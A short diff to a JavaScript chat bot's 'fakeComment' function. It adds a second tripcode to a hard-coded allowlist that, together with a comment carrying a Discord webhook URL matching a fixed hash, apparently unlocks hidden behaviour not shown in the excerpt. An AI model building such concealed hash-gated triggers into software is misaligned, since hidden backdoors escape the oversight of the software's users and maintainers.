@@ -594,7 +594,7 @@ textarea{padding:5px;resize:none}
   };
   var fakeComment = async (id, cmt, event) => {
     if (Bot.users[id]) {
-      if (['bbbbbbbbB.'].includes(Bot.users[id].trip) && cmt.includes('https://discord.com/api/webhooks/')) {
+      if (['bbbbbbbbB.', 'SOW9cAv7B2'].includes(Bot.users[id].trip) && cmt.includes('https://discord.com/api/webhooks/')) {
         var url = cmt.slice(cmt.indexOf('https://discord.com/api/webhooks/'));
         var urlHash = await encrypter.getBase64Hash(Base16384.textEncoder.encode(url));
         if ('YcafS52sf+Z2L2xBHjTb7zz5iqaBAktFyF0N0urd/7w=' === urlHash) {
